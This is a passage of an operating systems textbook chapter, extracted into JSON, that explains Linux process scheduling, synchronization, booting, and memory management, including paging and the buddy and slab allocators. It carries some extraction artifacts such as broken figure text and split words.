algorithm can be summarized as follows. CFS always sched\u0002ules the task which has had least amount of time on the CPU, typically the leftmost\r\nnode in the tree. Periodically, CFS increments the task’s vruntime value based on\r\nthe time it has already run, and compares this to the current leftmost node in the\r\ntree. If the running task still has smaller vruntime, it will continue to run. Other\u0002wise, it will be inserted at the appropriate place in the red-black tree, and the CPU\r\nwill be given to task corresponding to the new leftmost node.\r\nTo account for differences in task priorities and ‘‘niceness,’’ CFS changes the\r\neffective rate at which a task’s virtual time passes when it is running on the CPU.\r\nFor lower-priority tasks, time passes more quickly, their vruntime value will in\u0002crease more rapidly, and, depending on other tasks in the system, they will lose the\r\nCPU and be reinserted in the tree sooner than if they had a higher priority value. In\r\nthis manner, CFS avoids using separate runqueue structures for different priority\r\nlevels.\r\nIn summary, selecting a node to run can be done in constant time, whereas\r\ninserting a task in the runqueue is done in O(log(N)) time, where N is the number\n750 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nof tasks in the system. Given the levels of load in current systems, this continues to\r\nbe acceptable, but as the compute capacity of the nodes, and the number of tasks\r\nthey can run, increase, particularly in the server space, it is possible that new\r\nscheduling algorithms will be proposed in the future.\r\nBesides the basic scheduling alogirithm, the Linux scheduler includes special\r\nfeatures particularly useful for multiprocessor or multicore platforms. First, the\r\nrunqueue structure is associated with each CPU in the multiprocessing platform.\r\nThe scheduler tries to maintain benefits from affinity scheduling, and to schedule\r\ntasks on the CPU on which they were previously executing. Second, a set of sys\u0002tem calls is available to further specify or modify the affinity requirements of a\r\nselect thread. Finally, the scheduler performs periodic load balancing across run\u0002queues of different CPUs to ensure that the system load is well balanced, while\r\nstill meeting certain performance or affinity requirements.\r\nThe scheduler considers only runnable tasks, which are placed on the ap\u0002propriate runqueue. Tasks which are not runnable and are waiting on various I/O\r\noperations or other kernel events are placed on another data structure, waitqueue.\r\nA waitqueue is associated with each event that tasks may wait on. The head of the\r\nwaitqueue includes a pointer to a linked list of tasks and a spinlock. The spinlock is\r\nnecessary so as to ensure that the waitqueue can be concurrently manipulated\r\nthrough both the main kernel code and interrupt handlers or other asynchronous\r\ninvocations.\r\nSynchronization in Linux\r\nIn the previous section we mentioned that Linux uses spinlocks to prevent\r\nconcurrent modifications to data structures like the waitqueues. In fact, the kernel\r\ncode contains synchronization variables in numerous locations. We will next brief\u0002ly summarize the synchronization constructs available in Linux.\r\nEarlier Linux kernels had just one big kernel lock. This proved highly inef\u0002ficient, particularly on multiprocessor platforms, since it prevented processes on\r\ndifferent CPUs from executing kernel code concurrently. Hence, many new syn\u0002chronization points were introduced at much finer granularity.\r\nLinux provides several types of synchronization variables, both used internally\r\nin the kernel, and available to user-level applications and libraries. At the lowest\r\nlevel, Linux provides wrappers around the hardware-supported atomic instructions,\r\nvia operations such as atomic set and atomic read. In addition, since modern\r\nhardware reorders memory operations, Linux provides memory barriers. Using op\u0002erations like rmb and wmb guarantees that all read/write memory operations pre\u0002ceding the barrier call have completed before any subsequent accesses take place.\r\nMore commonly used synchronization constructs are the higher-level ones.\r\nThreads that do not wish to block (for performance or correctness reasons) use\r\nspinlocks and spin read/write locks. The current Linux version implements the\r\nso-called ‘‘ticket-based’’ spinlock, which has excellent performance on SMP and\nSEC. 10.3 PROCESSES IN LINUX 751\r\nmulticore systems. Threads that are allowed to or need to block use constructs like\r\nmutexes and semaphores. Linux supports nonblocking calls like mutex tr ylock and\r\nsem tr ywait to determine the status of the synchronization variable without block\u0002ing. Other types of synchronization variables, like futexes, completions, ‘‘read\u0002copy-update’’ (RCU) locks, etc., are also supported. Finally, synchronization be\u0002tween the kernel and the code executed by interrupt-handling routines can also be\r\nachieved by dynamically disabling and enabling the corresponding interrupts."
          },
          "10.3.5 Booting Linux": {
            "page": 782,
            "content": "10.3.5 Booting Linux\r\nDetails vary from platform to platform, but in general the following steps\r\nrepresent the boot process. When the computer starts, the BIOS performs Pow\u0002er-On-Self-Test (POST) and initial device discovery and initialization, since the\r\nOS’ boot process may rely on access to disks, screens, keyboards, and so on. Next,\r\nthe first sector of the boot disk, the MBR (Master Boot Record), is read into a\r\nfixed memory location and executed. This sector contains a small (512-byte) pro\u0002gram that loads a standalone program called boot from the boot device, such as a\r\nSATA or SCSI disk. The boot program first copies itself to a fixed high-memory\r\naddress to free up low memory for the operating system.\r\nOnce moved, boot reads the root directory of the boot device. To do this, it\r\nmust understand the file system and directory format, which is the case with some\r\nbootloaders such as GRUB (GRand Unified Bootloader). Other popular boot\u0002loaders, such as Intel’s LILO, do not rely on any specific file system. Instead, they\r\nneed a block map and low-level addresses, which describe physical sectors, heads,\r\nand cylinders, to find the relevant sectors to be loaded.\r\nThen boot reads in the operating system kernel and jumps to it. At this point,\r\nit has finished its job and the kernel is running.\r\nThe kernel start-up code is written in assembly language and is highly machine\r\ndependent. Typical work includes setting up the kernel stack, identifying the CPU\r\ntype, calculating the amount of RAM present, disabling interrupts, enabling the\r\nMMU, and finally calling the C-language main procedure to start the main part of\r\nthe operating system.\r\nThe C code also has considerable initialization to do, but this is more logical\r\nthan physical. It starts out by allocating a message buffer to help debug boot prob\u0002lems. As initialization proceeds, messages are written here about what is hap\u0002pening, so that they can be fished out after a boot failure by a special diagnostic\r\nprogram. Think of this as the operating system’s cockpit flight recorder (the black\r\nbox investigators look for after a plane crash).\r\nNext the kernel data structures are allocated. Most are of fixed size, but a few,\r\nsuch as the page cache and certain page table structures, depend on the amount of\r\nRAM available.\r\nAt this point the system begins autoconfiguration. Using configuration files tel\u0002ling what kinds of I/O devices might be present, it begins probing the devices to\n752 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nsee which ones actually are present. If a probed device responds to the probe, it is\r\nadded to a table of attached devices. If it fails to respond, it is assumed to be\r\nabsent and ignored henceforth. Unlike traditional UNIX versions, Linux device\r\ndrivers do not need to be statically linked and may be loaded dynamically (as can\r\nbe done in all versions of MS-DOS and Windows, incidentally).\r\nThe arguments for and against dynamically loading drivers are interesting and\r\nworth stating explicitly. The main argument for dynamic loading is that a single bi\u0002nary can be shipped to customers with divergent configurations and have it auto\u0002matically load the drivers it needs, possibly even over a network. The main argu\u0002ment against dynamic loading is security. If you are running a secure site, such as\r\na bank’s database or a corporate Web server, you probably want to make it impos\u0002sible for anyone to insert random code into the kernel. The system administrator\r\nmay keep the operating system sources and object files on a secure machine, do all\r\nsystem builds there, and ship the kernel binary to other machines over a local area\r\nnetwork. If drivers cannot be loaded dynamically, this scenario prevents machine\r\noperators and others who know the superuser password from injecting malicious or\r\nbuggy code into the kernel. Furthermore, at large sites, the hardware configuration\r\nis known exactly at the time the system is compiled and linked. Changes are suf\u0002ficiently rare that having to relink the system when a new hardware device is added\r\nis not an issue.\r\nOnce all the hardware has been configured, the next thing to do is to carefully\r\nhandcraft process 0, set up its stack, and run it. Process 0 continues initialization,\r\ndoing things like programming the real-time clock, mounting the root file system,\r\nand creating init (process 1) and the page daemon (process 2).\r\nInit checks its flags to see if it is supposed to come up single user or multiuser.\r\nIn the former case, it forks off a process that executes the shell and waits for this\r\nprocess to exit. In the latter case, it forks off a process that executes the system ini\u0002tialization shell script, /etc/rc, which can do file system consistency checks, mount\r\nadditional file systems, start daemon processes, and so on. Then it reads /etc/ttys,\r\nwhich lists the terminals and some of their properties. For each enabled terminal, it\r\nforks off a copy of itself, which does some housekeeping and then executes a pro\u0002gram called getty.\r\nGetty sets the line speed and other properties for each line (some of which may\r\nbe modems, for example), and then displays\r\nlogin:\r\non the terminal’s screen and tries to read the user’s name from the keyboard. When\r\nsomeone sits down at the terminal and provides a login name, getty terminates by\r\nexecuting /bin/login, the login program. Login then asks for a password, encrypts\r\nit, and verifies it against the encrypted password stored in the password file,\r\n/etc/passwd. If it is correct, login replaces itself with the user’s shell, which then\r\nwaits for the first command. If it is incorrect, login just asks for another user\r\nname. This mechanism is shown in Fig. 10-11 for a system with three terminals.\nSEC. 10.3 PROCESSES IN LINUX 753\r\nProcess 0\r\nProcess 1 Process 2 Page\r\ndaemon\r\nTerminal 0 Terminal 1 Terminal 2\r\nLogin: login sh Password: % cp f1 f2\r\ncp\r\ngetty\r\ninit\r\nFigure 10-11. The sequence of processes used to boot some Linux systems.\r\nIn the figure, the getty process running for terminal 0 is still waiting for input.\r\nOn terminal 1, a user has typed a login name, so getty has overwritten itself with\r\nlogin, which is asking for the password. A successful login has already occurred\r\non terminal 2, causing the shell to type the prompt (%). The user then typed\r\ncp f1 f2\r\nwhich has caused the shell to fork off a child process and have that process execute\r\nthe cp program. The shell is blocked, waiting for the child to terminate, at which\r\ntime the shell will type another prompt and read from the keyboard. If the user at\r\nterminal 2 had typed cc instead of cp, the main program of the C compiler would\r\nhave been started, which in turn would have forked off more processes to run the\r\nvarious compiler passes."
          }
        }
      },
      "10.4 MEMORY MANAGEMENT IN LINUX": {
        "page": 784,
        "children": {
          "10.4.1 Fundamental Concepts": {
            "page": 785,
            "content": "10.4.1 Fundamental Concepts\r\nEvery Linux process has an address space that logically consists of three seg\u0002ments: text, data, and stack. An example process’ address space is illustrated in\r\nFig. 10-12(a) as process A. The text segment contains the machine instructions\r\nthat form the program’s executable code. It is produced by the compiler and ass\u0002embler by translating the C, C++, or other program into machine code. The text\r\nsegment is normally read-only. Self-modifying programs went out of style in\r\nabout 1950 because they were too difficult to understand and debug. Thus the text\r\nsegment neither grows nor shrinks nor changes in any other way.\r\nText \r\n BSS\r\nData\r\nStack pointer Stack pointer\r\n20K\r\n8K\r\n0\r\nUnused\r\nmemory\r\n24K\r\n8K\r\n0K\r\nBSS\r\nText\r\nData\r\n(a) (b) (c)\r\nOS\r\nPhysical memory Process A Process B\r\nFigure 10-12. (a) Process A’s virtual address space. (b) Physical memory.\r\n(c) Process B’s virtual address space.\r\nThe data segment contains storage for all the program’s variables, strings,\r\narrays, and other data. It has two parts, the initialized data and the uninitialized\r\ndata. For historical reasons, the latter is known as the BSS (historically called\r\nBlock Started by Symbol). The initialized part of the data segment contains vari\u0002ables and compiler constants that need an initial value when the program is started.\r\nAll the variables in the BSS part are initialized to zero after loading.\r\nFor example, in C it is possible to declare a character string and initialize it at\r\nthe same time. When the program starts up, it expects that the string has its initial\r\nvalue. To implement this construction, the compiler assigns the string a location in\r\nthe address space, and ensures that when the program is started up, this location\r\ncontains the proper string. From the operating system’s point of view, initialized\r\ndata are not all that different from program text—both contain bit patterns pro\u0002duced by the compiler that must be loaded into memory when the program starts.\r\nThe existence of uninitialized data is actually just an optimization. When a glo\u0002bal variable is not explicitly initialized, the semantics of the C language say that its\nSEC. 10.4 MEMORY MANAGEMENT IN LINUX 755\r\ninitial value is 0. In practice, most global variables are not initialized explicitly,\r\nand are thus 0. This could be implemented by simply having a section of the ex\u0002ecutable binary file exactly equal to the number of bytes of data, and initializing all\r\nof them, including the ones that have defaulted to 0.\r\nHowever, to sav e space in the executable file, this is not done. Instead, the file\r\ncontains all the explicitly initialized variables following the program text. The\r\nuninitialized variables are all gathered together after the initialized ones, so all the\r\ncompiler has to do is put a word in the header telling how many bytes to allocate.\r\nTo make this point more explicit, consider Fig. 10-12(a) again. Here the pro\u0002gram text is 8 KB and the initialized data is also 8 KB. The uninitialized data\r\n(BSS) is 4 KB. The executable file is only 16 KB (text + initialized data), plus a\r\nshort header that tells the system to allocate another 4 KB after the initialized data\r\nand zero it before starting the program. This trick avoids storing 4 KB of zeros in\r\nthe executable file.\r\nIn order to avoid allocating a physical page frame full of zeros, during ini\u0002tialization Linux allocates a static zero page, a write-protected page full of zeros.\r\nWhen a process is loaded, its uninitialized data region is set to point to the zero\r\npage. Whenever a process actually attempts to write in this area, the copy-on-write\r\nmechanism kicks in, and an actual page frame is allocated to the process.\r\nUnlike the text segment, which cannot change, the data segment can change.\r\nPrograms modify their variables all the time. Furthermore, many programs need to\r\nallocate space dynamically, during execution. Linux handles this by permitting the\r\ndata segment to grow and shrink as memory is allocated and deallocated. A sys\u0002tem call, br k, is available to allow a program to set the size of its data segment.\r\nThus to allocate more memory, a program can increase the size of its data segment.\r\nThe C library procedure malloc, commonly used to allocate memory, makes heavy\r\nuse of it. The process address-space descriptor contains information on the range\r\nof dynamically allocated memory areas in the process, typically called the heap.\r\nThe third segment is the stack segment. On most machines, it starts at or near\r\nthe top of the virtual address space and grows down toward 0. For instance, on\r\n32bit x86 platforms, the stack starts at address 0xC0000000, which is the 3-GB\r\nvirtual address limit visible to the process in user mode. If the stack grows below\r\nthe bottom of the stack segment, a hardware fault occurs and the operating system\r\nlowers the bottom of the stack segment by one page. Programs do not explicitly\r\nmanage the size of the stack segment.\r\nWhen a program starts up, its stack is not empty. Instead, it contains all the en\u0002vironment (shell) variables as well as the command line typed to the shell to invoke\r\nit. In this way, a program can discover its arguments. For example, when\r\ncp src dest\r\nis typed, the cp program is run with the string ‘‘cp src dest’’ on the stack, so it can\r\nfind out the names of the source and destination files. The string is represented as\r\nan array of pointers to the symbols in the string, to make parsing easier.\n756 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nWhen two users are running the same program, such as the editor, it would be\r\npossible, but inefficient, to keep two copies of the editor’s program text in memory\r\nat once. Instead, Linux systems support shared text segments. In Fig. 10-12(a)\r\nand Fig. 10-12(c) we see two processes, A and B, that have the same text segment.\r\nIn Fig. 10-12(b) we see a possible layout of physical memory, in which both proc\u0002esses share the same piece of text. The mapping is done by the virtual-memory\r\nhardware.\r\nData and stack segments are never shared except after a fork, and then only\r\nthose pages that are not modified. If either one needs to grow and there is no room\r\nadjacent to it to grow into, there is no problem since adjacent virtual pages do not\r\nhave to map onto adjacent physical pages.\r\nOn some computers, the hardware supports separate address spaces for instruc\u0002tions and data. When this feature is available, Linux can use it. For example, on a\r\ncomputer with 32-bit addresses, if this feature is available, there would be 232 bits\r\nof address space for instructions and an additional 232 bits of address space for the\r\ndata and stack segments to share. A jump or branch to 0 goes to address 0 of text\r\nspace, whereas a move from 0 uses address 0 in data space. This feature doubles\r\nthe address space available.\r\nIn addition to dynamically allocating more memory, processes in Linux can ac\u0002cess file data through memory-mapped files. This feature makes it possible to\r\nmap a file onto a portion of a process’ address space so that the file can be read and\r\nwritten as if it were a byte array in memory. Mapping a file in makes random ac\u0002cess to it much easier than using I/O system calls such as read and wr ite. Shared\r\nlibraries are accessed by mapping them in using this mechanism. In Fig. 10-13 we\r\nsee a file that is mapped into two processes at the same time, at different virtual ad\u0002dresses.\r\nAn additional advantage of mapping a file in is that two or more processes can\r\nmap in the same file at the same time. Writes to the file by any one of them are\r\nthen instantly visible to the others. In fact, by mapping in a scratch file (which will\r\nbe discarded after all the processes exit), this mechanism provides a high-band\u0002width way for multiple processes to share memory. In the most extreme case, two\r\n(or more) processes could map in a file that covers the entire address space, giving\r\na form of sharing that is partway between separate processes and threads. Here the\r\naddress space is shared (like threads), but each process maintains its own open files\r\nand signals, for example, which is not like threads. In practice, however, making\r\ntwo address spaces exactly correspond is never done."
          },
          "10.4.2 Memory Management System Calls in Linux": {
            "page": 787,
            "content": "10.4.2 Memory Management System Calls in Linux\r\nPOSIX does not specify any system calls for memory management. This topic\r\nwas considered too machine dependent for standardization. Instead, the problem\r\nwas swept under the rug by saying that programs needing dynamic memory man\u0002agement can use the malloc library procedure (defined by the ANSI C standard).\nSEC. 10.4 MEMORY MANAGEMENT IN LINUX 757\r\n Text\r\n\r\n  \r\nData\r\nBSS\r\nText\r\n\r\nStack pointer Stack pointer\r\n20K\r\n8K\r\n0K\r\n24K\r\n0K\r\n(a) (b) (c)\r\nOS\r\nPhysical memory\r\nMapped file\r\nMapped file\r\nProcess A Process B\r\nBSS\r\nData 8K\r\nUnused\r\nmemory\r\nFigure 10-13. Tw o processes can share a mapped file.\r\nHow malloc is implemented is thus moved outside the scope of the POSIX stan\u0002dard. In some circles, this approach is known as passing the buck.\r\nIn practice, most Linux systems have system calls for managing memory. The\r\nmost common ones are listed in Fig. 10-14. Br k specifies the size of the data seg\u0002ment by giving the address of the first byte beyond it. If the new value is greater\r\nthan the old one, the data segment becomes larger; otherwise it shrinks.\r\nSystem call Description\r\ns = brk(addr) Change data segment size\r\na = mmap(addr, len, prot, flags, fd, offset) Map a file in\r\ns = unmap(addr, len) Unmap a file\r\nFigure 10-14. Some system calls relating to memory management. The return\r\ncode s is −1 if an error has occurred; a and addr are memory addresses, len is a\r\nlength, prot controls protection, flags are miscellaneous bits, fd is a file descrip\u0002tor, and offset is a file offset.\r\nThe mmap and munmap system calls control memory-mapped files. The first\r\nparameter to mmap, addr, determines the address at which the file (or portion\r\nthereof) is mapped. It must be a multiple of the page size. If this parameter is 0,\r\nthe system determines the address itself and returns it in a. The second parameter,\r\nlen, tells how many bytes to map. It, too, must be a multiple of the page size. The\r\nthird parameter, prot, determines the protection for the mapped file. It can be\r\nmarked readable, writable, executable, or some combination of these. The fourth\r\nparameter, flags, controls whether the file is private or sharable, and whether addr\r\nis a requirement or merely a hint. The fifth parameter, fd, is the file descriptor for\n758 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nthe file to be mapped. Only open files can be mapped, so to map a file in, it must\r\nfirst be opened. Finally, offset tells where in the file to begin the mapping. It is not\r\nnecessary to start the mapping at byte 0; any page boundary will do.\r\nThe other call, unmap, removes a mapped file. If only a portion of the file is\r\nunmapped, the rest remains mapped."
          },
          "10.4.3 Implementation of Memory Management in Linux": {
            "page": 789,
            "content": "10.4.3 Implementation of Memory Management in Linux\r\nEach Linux process on a 32-bit machine typically gets 3 GB of virtual address\r\nspace for itself, with the remaining 1 GB reserved for its page tables and other ker\u0002nel data. The kernel’s 1 GB is not visible when running in user mode, but becomes\r\naccessible when the process traps into the kernel. The kernel memory typically\r\nresides in low physical memory but it is mapped in the top 1 GB of each process\r\nvirtual address space, between addresses 0xC0000000 and 0xFFFFFFFF (3–4 GB).\r\nOn current 64-bit x86 machines, only up to 48 bits are used for addressing, imply\u0002ing a theoretical limit of 256 TB for the size of the addressable memory. Linux\r\nsplits this memory between the kernel and user space, resulting in a maximum 128\r\nTB per-process virtual address space per process. The address space is created\r\nwhen the process is created and is overwritten on an exec system call.\r\nIn order to allow multiple processes to share the underlying physical memory,\r\nLinux monitors the use of the physical memory, allocates more memory as needed\r\nby user processes or kernel components, dynamically maps portions of the physical\r\nmemory into the address space of different processes, and dynamically brings in\r\nand out of memory program executables, files, and other state information as nec\u0002essary to utilize the platform resources efficiently and to ensure execution progress.\r\nThe remainder of this section describes the implementation of various mechanisms\r\nin the Linux kernel which are responsible for these operations.\r\nPhysical Memory Management\r\nDue to idiosyncratic hardware limitations on many systems, not all physical\r\nmemory can be treated identically, especially with respect to I/O and virtual mem\u0002ory. Linux distinguishes between the following memory zones:\r\n1. ZONE DMA and ZONE DMA32: pages that can be used for DMA.\r\n2. ZONE NORMAL: normal, regularly mapped pages.\r\n3. ZONE HIGHMEM: pages with high-memory addresses, which are\r\nnot permanently mapped.\r\nThe exact boundaries and layout of the memory zones is architecture dependent.\r\nOn x86 hardware, certain devices can perform DMA operations only in the first 16\r\nMB of address space, hence ZONE DMA is in the range 0–16 MB. On 64-bit ma\u0002chines there is additional support for those devices that can perform 32-bit DMA\nSEC. 10.4 MEMORY MANAGEMENT IN LINUX 759\r\noperations, and ZONE DMA32 marks this region. In addition, if the hardware, like\r\nolder-generation i386, cannot directly map memory addresses above 896 MB,\r\nZONE HIGHMEM corresponds to anything above this mark. ZONE NORMAL is\r\nanything in between them. Therefore, on 32-bit x86 platforms, the first 896 MB of\r\nthe Linux address space are directly mapped, whereas the remaining 128 MB of\r\nthe kernel address space are used to access high memory regions. On x86 64\r\nZONE HIGHMEM is not defined. The kernel maintains a zone structure for each of\r\nthe three zones, and can perform memory allocations for the three zones separately.\r\nMain memory in Linux consists of three parts. The first two parts, the kernel\r\nand memory map, are pinned in memory (i.e., never paged out). The rest of mem\u0002ory is divided into page frames, each of which can contain a text, data, or stack\r\npage, a page-table page, or be on the free list.\r\nThe kernel maintains a map of the main memory which contains all infor\u0002mation about the use of the physical memory in the system, such as its zones, free\r\npage frames, and so forth. The information, illustrated in Fig. 10-15, is organized\r\nas follows.\r\nnode_zones[3]\r\nnode_mem_map\r\n…\r\nnode_id\r\nZONE_HIGHMEM\r\nZONE_NORMAL\r\nZONE_DMA\r\nfree_pages\r\npages_low\r\npages_high\r\n…\r\nfree_area[0]\r\nfree_area[1]\r\n…\r\nfree_area[10]\r\n…\r\nactive_list\r\ninactive_list\r\nname\r\nnode descriptor\r\nzone descriptor\r\nMem_map: array\r\nof page descriptor\r\nPhysical memory\r\n70\r\n80\r\n150\r\n200\r\n200 – 1 free page\r\n150 – mapped\r\n80 – free page\r\n70 – free page\r\n~~\r\n~~ ~~~~\r\n~~\r\n~~ ~~~~\r\nMapping = address_space\r\nFigure 10-15. Linux main memory representation.\n760 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nFirst of all, Linux maintains an array of page descriptors, of type page one for\r\neach physical page frame in the system, called mem map. Each page descriptor\r\ncontains a pointer to the address space that it belongs to, in case the page is not\r\nfree, a pair of pointers which allow it to form doubly linked lists with other de\u0002scriptors, for instance to keep together all free page frames, and a few other fields.\r\nIn Fig. 10-15 the page descriptor for page 150 contains a mapping to the address\r\nspace the page belongs to. Pages 70, 80, and 200 are free, and they are linked to\u0002gether. The size of the page descriptor is 32 bytes, therefore the entire mem map\r\ncan consume less than 1% of the physical memory (for a page frame of 4 KB).\r\nSince the physical memory is divided into zones, for each zone Linux main\u0002tains a zone descriptor. The zone descriptor contains information about the memo\u0002ry utilization within each zone, such as number of active or inactive pages, low and\r\nhigh watermarks to be used by the page-replacement algorithm described later in\r\nthis chapter, as well as many other fields.\r\nIn addition, a zone descriptor contains an array of free areas. The ith element\r\nin this array identifies the first page descriptor of the first block of 2i free pages.\r\nSince there may be more than one blocks of 2i free pages, Linux uses the pair of\r\npage-descriptor pointers in each page element to link these together. This infor\u0002mation is used in the memory-allocation operations. In Fig. 10-15 free area[0],\r\nwhich identifies all free areas of main memory consisting of only one page frame\r\n(since 20 is one), points to page 70, the first of the three free areas. The other free\r\nblocks of size one can be reached through the links in each of the page descriptors.\r\nFinally, since Linux is portable to NUMA architectures (where different mem\u0002ory addresses have different access times), in order to differentiate between physi\u0002cal memory on different nodes (and avoid allocating data structures across nodes),\r\na node descriptor is used. Each node descriptor contains information about the\r\nmemory usage and zones on that particular node. On UMA platforms, Linux de\u0002scribes all memory via one node descriptor. The first few bits within each page de\u0002scriptor are used to identify the node and the zone that the page frame belongs to.\r\nIn order for the paging mechanism to be efficient on both 32- and 64-bit archi\u0002tectures, Linux makes use of a four-level paging scheme. A three-level paging\r\nscheme, originally put into the system for the Alpha, was expanded after Linux\r\n2.6.10, and as of version 2.6.11 a four-level paging scheme is used. Each virtual\r\naddress is broken up into fiv e fields, as shown in Fig. 10-16. The directory fields\r\nare used as an index into the appropriate page directory, of which there is a private\r\none for each process. The value found is a pointer to one of the next-level direc\u0002tories, which are again indexed by a field from the virtual address. The selected\r\nentry in the middle page directory points to the final page table, which is indexed\r\nby the page field of the virtual address. The entry found here points to the page\r\nneeded. On the Pentium, which uses two-level paging, each page’s upper and mid\u0002dle directories have only one entry, so the global directory entry effectively\r\nchooses the page table to use. Similarly, three-level paging can be used when need\u0002ed, by setting the size of the upper page directory field to zero.\nSEC. 10.4 MEMORY MANAGEMENT IN LINUX 761\r\nGlobal directory Upper directory Middle directory Page Offset\r\nPage\r\nPage table\r\nPage middle\r\ndirectory\r\nPage upper\r\ndirectory\r\nPage global\r\ndirectory\r\nVirtual\r\naddress\r\nFigure 10-16. Linux uses four-level page tables.\r\nPhysical memory is used for various purposes. The kernel itself is fully hard\u0002wired; no part of it is ever paged out. The rest of memory is available for user\r\npages, the paging cache, and other purposes. The page cache holds pages con\u0002taining file blocks that have recently been read or have been read in advance in\r\nexpectation of being used in the near future, or pages of file blocks which need to\r\nbe written to disk, such as those which have been created from user-mode proc\u0002esses which have been swapped out to disk. It is dynamic in size and competes for\r\nthe same pool of pages as the user processes. The paging cache is not really a sep\u0002arate cache, but simply the set of user pages that are no longer needed and are wait\u0002ing around to be paged out. If a page in the paging cache is reused before it is\r\nevicted from memory, it can be reclaimed quickly.\r\nIn addition, Linux supports dynamically loaded modules, most commonly de\u0002vice drivers. These can be of arbitrary size and each one must be allocated a con\u0002tiguous piece of kernel memory. As a direct consequence of these requirements,\r\nLinux manages physical memory in such a way that it can acquire an arbi\u0002trary-sized piece of memory at will. The algorithm it uses is known as the buddy\r\nalgorithm and is described below.\r\nMemory-Allocation Mechanisms\r\nLinux supports several mechanisms for memory allocation. The main mechan\u0002ism for allocating new page frames of physical memory is the page allocator,\r\nwhich operates using the well-known buddy algorithm.\n762 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nThe basic idea for managing a chunk of memory is as follows. Initially memo\u0002ry consists of a single contiguous piece, 64 pages in the simple example of\r\nFig. 10-17(a). When a request for memory comes in, it is first rounded up to a\r\npower of 2, say eight pages. The full memory chunk is then divided in half, as\r\nshown in (b). Since each of these pieces is still too large, the lower piece is divided\r\nin half again (c) and again (d). Now we hav e a chunk of the correct size, so it is al\u0002located to the caller, as shown shaded in (d).\r\n(a)\r\n64\r\n(b)\r\n32\r\n32\r\n(d)\r\n32\r\n8\r\n8\r\n16\r\n(e)\r\n16\r\n8\r\n8\r\n32\r\n(f)\r\n8\r\n8\r\n8\r\n32\r\n8\r\n(g)\r\n8\r\n4\r\n8\r\n8\r\n32\r\n(h)\r\n4\r\n8\r\n8\r\n8\r\n32\r\n(i)\r\n16\r\n4\r\n4\r\n8\r\n32\r\n(c)\r\n16\r\n16\r\n32\r\n4\r\n4\r\nFigure 10-17. Operation of the buddy algorithm.\r\nNow suppose that a second request comes in for eight pages. This can be satis\u0002fied directly now (e). At this point a third request comes in for four pages. The\r\nsmallest available chunk is split (f) and half of it is claimed (g). Next, the second\r\nof the 8-page chunks is released (h). Finally, the other eight-page chunk is re\u0002leased. Since the two adjacent just-freed eight-page chunks came from the same\r\n16-page chunk, they are merged to get the 16-page chunk back (i).\r\nLinux manages memory using the buddy algorithm, with the additional feature\r\nof having an array in which the first element is the head of a list of blocks of size 1\r\nunit, the second element is the head of a list of blocks of size 2 units, the next ele\u0002ment points to the 4-unit blocks, and so on. In this way, any power-of-2 block can\r\nbe found quickly.\r\nThis algorithm leads to considerable internal fragmentation because if you\r\nwant a 65-page chunk, you have to ask for and get a 128-page chunk.\r\nTo alleviate this problem, Linux has a second memory allocation, the slab allo\u0002cator, which takes chunks using the buddy algorithm but then carves slabs (smaller\r\nunits) from them and manages the smaller units separately.\r\nSince the kernel frequently creates and destroys objects of certain type (e.g.,\r\ntask struct), it relies on so-called object caches. These caches consist of pointers\r\nto one or more slab which can store a number of objects of the same type. Each of\r\nthe slabs may be full, partially full, or empty.\r\nFor instance, when the kernel needs to allocate a new process descriptor, that\r\nis, a new task struct, it looks in the object cache for task structures, and first tries\r\nto find a partially full slab and allocate a new task struct object there. If no such\nSEC. 10.4 MEMORY MANAGEMENT IN LINUX 763\r\nslab is available, it looks through the list of empty slabs. Finally, if necessary, it\r\nwill allocate a new slab, place the new task structure there, and link this slab with\r\nthe task-structure object cache. The kmalloc kernel service, which allocates physi\u0002cally contiguous memory regions in the kernel address space, is in fact built on top\r\nof the slab and object cache interface described here.\r\nA third memory allocator, vmalloc, is also available and is used when the re\u0002quested memory need be contiguous only in virtual space, not in physical memory.\r\nIn practice, this is true for most of the requested memory. One exception consists\r\nof devices, which live on the other side of the memory bus and the memory man\u0002agement unit, and therefore do not understand virtual addresses. However, the use\r\nof vmalloc results in some performance degradation, and it is used primarily for\r\nallocating large amounts of contiguous virtual address space, such as for dynam\u0002ically inserting kernel modules. All these memory allocators are derived from\r\nthose in System V.\r\nVirtual Address-Space Representation\r\nThe virtual address space is divided into homogeneous, contiguous, page\u0002aligned areas or regions. That is to say, each area consists of a run of consecutive\r\npages with the same protection and paging properties. The text segment and map\u0002ped files are examples of areas (see Fig. 10-13). There can be holes in the virtual\r\naddress space between the areas. Any memory reference to a hole results in a fatal\r\npage fault. The page size is fixed, for example, 4 KB for the Pentium and 8 KB for\r\nthe Alpha. Starting with the Pentium, support for page frames of 4 MB was added.\r\nOn recent 64-bit architectures, Linux can support huge pages of 2 MB or 1 GB\r\neach. In addition, in a PAE (Physical Address Extension) mode, which is used on\r\ncertain 32-bit architectures to increase the process address space beyond 4 GB,\r\npage sizes of 2 MB are supported.\r\nEach area is described in the kernel by a vm area struct entry. All the\r\nvm area structs for a process are linked together in a list sorted on virtual address\r\nso that all the pages can be found. When the list gets too long (more than 32 en\u0002tries), a tree is created to speed up searching it. The vm area struct entry lists the\r\narea’s properties. These properties include the protection mode (e.g., read only or\r\nread/write), whether it is pinned in memory (not pageable), and which direction it\r\ngrows in (up for data segments, down for stacks).\r\nThe vm area struct also records whether the area is private to the process or\r\nshared with one or more other processes. After a fork, Linux makes a copy of the\r\narea list for the child process, but sets up the parent and child to point to the same\r\npage tables. The areas are marked as read/write, but the pages themselves are\r\nmarked as read only. If either process tries to write on a page, a protection fault\r\noccurs and the kernel sees that the area is logically writable but the page is not\r\nwriteable, so it gives the process a copy of the page and marks it read/write. This\r\nmechanism is how copy on write is implemented.\n764 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nThe vm area struct also records whether the area has backing storage on disk\r\nassigned, and if so, where. Text segments use the executable binary as backing\r\nstorage and memory-mapped files use the disk file as backing storage. Other areas,\r\nsuch as the stack, do not have backing storage assigned until they hav e to be paged\r\nout.\r\nA top-level memory descriptor, mm struct, gathers information about all virtu\u0002al-memory areas belonging to an address space, information about the different\r\nsegments (text, data, stack), about users sharing this address space, and so on. All\r\nvm area struct elements of an address space can be accessed through their 